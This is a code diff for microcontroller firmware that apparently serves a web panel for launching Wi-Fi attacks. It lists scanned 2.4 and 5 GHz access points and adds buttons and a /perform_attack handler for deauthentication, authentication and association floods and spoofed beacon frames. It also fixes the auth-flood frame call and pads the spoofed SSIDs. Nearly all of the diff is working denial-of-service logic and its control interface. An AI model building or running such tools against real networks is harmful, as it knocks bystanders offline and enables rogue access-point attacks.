@@ -1,3 +1,4 @@
+#include "LOGUARTClass.h"
 #include "vector"
 #include "wifi_conf.h"
 #include "map"
@@ -160,7 +161,6 @@ void handleRoot(WiFiClient &client) {
         color: #bfbfbb;
         padding: .2em 1em;
         border-radius: 3px;
-        // border-left: solid #20c20e 5px;
         font-weight: 100;
         text-align: center;
         width: 50%;
@@ -203,14 +203,12 @@ void handleRoot(WiFiClient &client) {
 
       td {
         word-break: keep-all;
-        // padding: 10px 6px;
         text-align: left;
         border-bottom: 1px solid #5d5d5d;
       }
       
       .tdMeter {
         word-break: break-all;
-        // padding: 10px 6px;
         padding-right: 10px;
         text-align: left;
         border-bottom: 1px solid #5d5d5d;
@@ -225,7 +223,6 @@ void handleRoot(WiFiClient &client) {
 
       th {
           word-break: break-word;
-          // padding: 10px 6px;
           text-align: left;
           border-bottom: 1px solid #5d5d5d;
       }
@@ -297,16 +294,11 @@ void handleRoot(WiFiClient &client) {
               /* Meter */
       .meter_background{
         background: #42464D;
-        // width: 100%;
         word-break: normal;
-        // min-width: 100px;
-        // min-width: 45px;
       }
       .meter_forground{
         color: #fff;
         padding: 4px 0;
-        /* + one of the colors below
-        (width will be set by the JS) */
       }
       .meter_green{
         background: #43B581;
@@ -335,20 +327,32 @@ void handleRoot(WiFiClient &client) {
       }
       
       .button-container {
-        display: flex; /* Usar flexbox */
-        justify-content: start; /* Espacio entre los botones */
-        align-items: center; /* Centra los elementos horizontalmente */
+        display: flex;
+        justify-content: start;
+        align-items: center;
         align-content: center;
         column-gap: 15px;
       }
 
       .button-double{
-        display: flex; /* Usar flexbox */
+        display: flex;
         flex-direction: column;
-        justify-content: start; /* Espacio entre los botones */
-        align-items: center; /* Centra los elementos horizontalmente */
+        justify-content: start;
+        align-items: center;
         align-content: center;
         row-gap: 15px;
+      }
+
+      .attack-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        align-items: flex-end;
+      }
+
+      .attack-row {
+        display: flex;
+        gap: 15px;
       }
 
       .upload-script,
@@ -359,7 +363,6 @@ void handleRoot(WiFiClient &client) {
       input[type=button] {
         display: inline-block;
         height: 38px;
-        // padding: 0 20px;
         color: #fff;
         text-align: center;
         font-size: 11px;
@@ -441,10 +444,11 @@ void handleRoot(WiFiClient &client) {
           </form>
         </div>
       </div>
-      <form method="post" action="/deauth">
+      
+      <form method="post" action="/perform_attack">
       <h2>Access Points: )" + String(scan_results.size()) + R"(</h2>
       <div class="centered">
-        <h3 class="bold">5 GHz networks</h3>  
+        <h3 class="bold">5 GHz networks</h3> 
       </div>
         <table>
           <tr>
@@ -455,31 +459,36 @@ void handleRoot(WiFiClient &client) {
             <th class='tdFixed'></th>
             <th class='selectColumn'></th>
           </tr>
-  )";
+  )" +
+  // 5 GHz 네트워크 목록 삽입
+  (
+    [&]() -> String {
+      String html = "";
+      for (uint32_t i = 0; i < scan_results.size(); i++) {
+        if (scan_results[i].channel >= 36) {
+          String color = "";
+          int width = scan_results[i].rssi + 120;
+          int colorWidth = scan_results[i].rssi + 130;
 
-  for (uint32_t i = 0; i < scan_results.size(); i++) {
-    if (scan_results[i].channel >= 36) {
-      String color = "";
-      int width = scan_results[i].rssi + 120;
-      int colorWidth = scan_results[i].rssi + 130;
+          if (colorWidth < 50) color = "meter_red";
+          else if (colorWidth < 70) color = "meter_orange";
+          else color = "meter_green";
 
-      if (colorWidth < 50) color = "meter_red";
-      else if (colorWidth < 70) color = "meter_orange";
-      else color = "meter_green";
-
-      response += "<tr>";
-      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
-      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
-      response += "<td>" + scan_results[i].bssid_str + "</td>";
-      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
-      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
-      response += "</tr>";
-    }
-  }
-  response += R"(
+          html += "<tr>";
+          html += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
+          html += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
+          html += "<td>" + scan_results[i].bssid_str + "</td>";
+          html += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
+          html += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
+          html += "</tr>";
+        }
+      }
+      return html;
+    })()
+  + R"(
         </table>
         <div class="centered">
-          <h3 class="bold">2.4 GHz networks</h3>  
+          <h3 class="bold">2.4 GHz networks</h3> 
         </div>
           <table>
             <tr>
@@ -490,53 +499,70 @@ void handleRoot(WiFiClient &client) {
               <th class='tdFixed'></th>
               <th class='selectColumn'></th>
             </tr>
-  )";
+  )" +
+  // 2.4 GHz 네트워크 목록 삽입
+  (
+    [&]() -> String {
+      String html = "";
+      for (uint32_t i = 0; i < scan_results.size(); i++) {
+        if (scan_results[i].channel <= 14) {
+          String color = "";
+          int width = scan_results[i].rssi + 120;
+          int colorWidth = scan_results[i].rssi + 130;
 
-  for (uint32_t i = 0; i < scan_results.size(); i++) {
-    if (scan_results[i].channel <= 14) {
-      String color = "";
-      int width = scan_results[i].rssi + 120;
-      int colorWidth = scan_results[i].rssi + 130;
-
-      if (colorWidth < 50) color = "meter_red";
-      else if (colorWidth < 70) color = "meter_orange";
-      else color = "meter_green";
-      
-      response += "<tr>";
-      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
-      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
-      response += "<td>" + scan_results[i].bssid_str + "</td>";
-      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
-      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
-      response += "</tr>";
-    }
-  }
-  response += R"(
-        </table>
-            <div class="right">
-              <div class="button-container">
-                <input type="submit" value="Start Attack!">  
+          if (colorWidth < 50) color = "meter_red";
+          else if (colorWidth < 70) color = "meter_orange";
+          else color = "meter_green";
+          
+          html += "<tr>";
+          html += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
+          html += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
+          html += "<td>" + scan_results[i].bssid_str + "</td>";
+          html += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
+          html += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
+          html += "</tr>";
+        }
+      }
+      return html;
+    })()
+  + R"(
+          </table>
+              <div class="right">
+                <div class="attack-buttons">
+                  <div class="attack-row">
+                    <input type="submit" value="Deauth" name="action_type">
+                  </div>
+                </div>
               </div>
-            </div>
-      </form>
-      <div class="right">
+              
+              <div class="right">
+                <div class="attack-buttons">
+                  <div class="attack-row">
+                    <input type="submit" value="Authentication" name="action_type">
+                    <input type="submit" value="Association" name="action_type">
+                    <input type="submit" value="Beacon" name="action_type">
+                  </div>
+                </div>
+              </div>
+      </form> <div class="right">
         <form method="post" action="/stop">
           <div class="button-container">
             <input type="submit" value="Stop">
           </div>
         </form>
       </div>
+
       <h2>Dashboard</h2>
     <table>
       <tr><th>State</th><th>Current Value</th></tr>
-  )";
-  response += "<tr><td>Status Attack</td><td>" + String(isDeauthing ? "Running" : "Stopped") + "</th></tr>";
-  response += "<tr><td>LED Enabled</td><td>" + String(led ? "Yes" : "No") + "</th></tr>";
-  response += "<tr><td>Frame Sent</td><td>" + String(sent_frames) + "</th></tr>";
-  response += "<tr><td>Send Delay</td><td>" + String(send_delay) + "</th></tr>";
-  response += "<tr><td>Number of frames send each time</td><td>" + String(frames_per_deauth) + "</th></tr>";
-  response += "</table>";
-  response += R"(
+  )" +
+  "<tr><td>Status Attack</td><td>" + String(isDeauthing ? "Running" : "Stopped") + "</th></tr>" +
+  "<tr><td>LED Enabled</td><td>" + String(led ? "Yes" : "No") + "</th></tr>" +
+  "<tr><td>Frame Sent</td><td>" + String(sent_frames) + "</th></tr>" +
+  "<tr><td>Send Delay</td><td>" + String(send_delay) + "</th></tr>" +
+  "<tr><td>Number of frames send each time</td><td>" + String(frames_per_deauth) + "</th></tr>" +
+  R"(
+    </table>
     <h2>Setup</h2>
       <div class="right">
         <div class="button-double">
@@ -574,7 +600,6 @@ void handleRoot(WiFiClient &client) {
 
   client.write(response.c_str());
 }
-
 void handle404(WiFiClient &client) {
   String response = makeResponse(404, "text/plain");
   response += "Not found!";
@@ -585,7 +610,6 @@ void web_setup() {
   pinMode(LED_R, OUTPUT);
   pinMode(LED_G, OUTPUT);
   pinMode(LED_B, OUTPUT);
-
   DEBUG_SER_INIT();
   WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
 
@@ -618,7 +642,7 @@ void random_mac(uint8_t *mac) {
   mac[0] = (mac[0] & 0xFE) | 0x02;
 }
 void flood_web(int mode){
-    
+  //Serial.println(isDeauthing);
   if (isDeauthing && !deauth_channels.empty()) {
     for (auto& group : deauth_channels) {
       int ch = group.first;
@@ -636,16 +660,17 @@ void flood_web(int mode){
           for (int idx : networks) {
             memcpy(deauth_bssid, scan_results[idx].bssid, 6);
             String ssid = scan_results[idx].ssid;
+            String ssid_for_B = ssid;
+            ssid_for_B += " ";
             switch(mode){
               case DEAUTH:
                 wifi_tx_deauth_frame(deauth_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",deauth_reason);
                 break;
               case BECAON:
-                
-                wifi_tx_beacon_frame_Privacy_RSN_IE(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid.c_str());
+                wifi_tx_beacon_frame_Privacy_RSN_IE(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid_for_B.c_str());
                 break;
               case AUTH:
-                wifi_tx_assoc_frame(random_src, (void*)deauth_bssid, ssid.c_str(), seq);
+                wifi_tx_auth_frame(random_src, (void*)deauth_bssid, seq);
                 break;
               case ASSOC:
                 wifi_tx_assoc_frame(random_src, (void*)deauth_bssid, ssid.c_str(), seq);
@@ -669,10 +694,34 @@ void flood_web(int mode){
   wext_set_channel(WLAN0_NAME, current_channel);  
 }
 int selectedNum = 0;
+
+void web_attack(int state, String request, String path){
+  Serial.println(state);
+  std::vector<std::pair<String, String>> post_data = parsePost(request);
+  deauth_channels.clear();
+  chs_idx.clear();
+  for (auto& param : post_data) {
+    if (param.first == "network") {
+      int idx = String(param.second).toInt();
+      int ch = scan_results[idx].channel;
+      Serial.println(ch);
+      Serial.println(idx);
+      deauth_channels[ch].push_back(idx);
+      chs_idx.push_back(ch);
+    } else if (param.first == "reason") {
+      deauth_reason = String(param.second).toInt();
+    }
+  }
+  if (!deauth_channels.empty()) {
+    isDeauthing = true;
+    selectedNum = state;
+  }
+}
+
 void web_stable(){
   WiFiClient client = server.available();
 
-  if (client.connected()){    
+  if (client.connected()){
     if (led) {
       digitalWrite(LED_G, HIGH);
     }
@@ -689,26 +738,56 @@ void web_stable(){
     } else if (path == "/rescan") {
       client.write(makeRedirect("/").c_str());
       scanNetworks();
-    } else if (path == "/deauth") {
+    } else if (path == "/perform_attack") { // 새로운 공격 처리 경로
       std::vector<std::pair<String, String>> post_data = parsePost(request);
-      deauth_channels.clear();
-      chs_idx.clear();
-      for (auto &param : post_data) {
-        if (param.first == "network") {
-          int idx = String(param.second).toInt();
-          int ch = scan_results[idx].channel;
-          deauth_channels[ch].push_back(idx);
-          chs_idx.push_back(ch);
-        } else if (param.first == "reason") {
-          deauth_reason = String(param.second).toInt();
+      int attack_mode = 0; // 기본값 0 (유효하지 않은 모드)
+
+      // 어떤 공격 버튼이 눌렸는지 확인
+      for (auto& param : post_data) {
+        if (param.first == "action_type") {
+          if (param.second == "Deauth") {
+            attack_mode = DEAUTH;
+          } else if (param.second == "Authentication") {
+            attack_mode = AUTH;
+          } else if (param.second == "Association") {
+            attack_mode = ASSOC;
+          } else if (param.second == "Beacon") {
+            attack_mode = BECAON; // BECAON -> BEACON 오타 수정도 여기에 반영
+          }
+          break; // action_type을 찾았으니 더 이상 루프를 돌 필요 없음
         }
       }
-      if (!deauth_channels.empty()) {
-        isDeauthing = true;
-        selectedNum = DEAUTH;
+
+      if (attack_mode != 0) { // 유효한 공격 모드인 경우에만 web_attack 호출
+        if(!isDeauthing) Serial.println("Attack Started: " + String(attack_mode));
+        web_attack(attack_mode, request, path);
+      } else {
+        Serial.println("Unknown attack type received.");
       }
       client.write(makeRedirect("/").c_str());
-    } else if (path == "/setframes") {
+    }
+    // 기존 /deauth, /auten, /assoc, /beacon 경로는 이제 필요 없습니다.
+    // 이 부분은 삭제하거나 주석 처리하세요.
+    /*
+    else if (path == "/deauth") {
+      if(!isDeauthing) Serial.println("Deauth Started");
+      web_attack(DEAUTH, request, path);
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/auten") {
+      if(!isDeauthing) {
+        Serial.println("auten Started");
+      }
+      web_attack(AUTH, request, path);
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/assoc") {
+      web_attack(ASSOC, request, path);
+      client.write(makeRedirect("/").c_str());
+    } else if (path == "/beacon") {
+      web_attack(BECAON, request, path); // 이 오타도 BEACON으로 수정해야 합니다.
+      client.write(makeRedirect("/").c_str());
+    }
+    */
+    else if (path == "/setframes") {
       std::vector<std::pair<String, String>> post_data = parsePost(request);
       for (auto &param : post_data) {
         if (param.first == "frames") {
@@ -719,7 +798,7 @@ void web_stable(){
       client.write(makeRedirect("/").c_str());
     } else if (path == "/setdelay") {
       std::vector<std::pair<String, String>> post_data = parsePost(request);
-    for (auto &param : post_data) {
+      for (auto &param : post_data) {
         if (param.first == "delay") {
           int delay = String(param.second).toInt();
           send_delay = delay <= 0 ? 5 : delay;
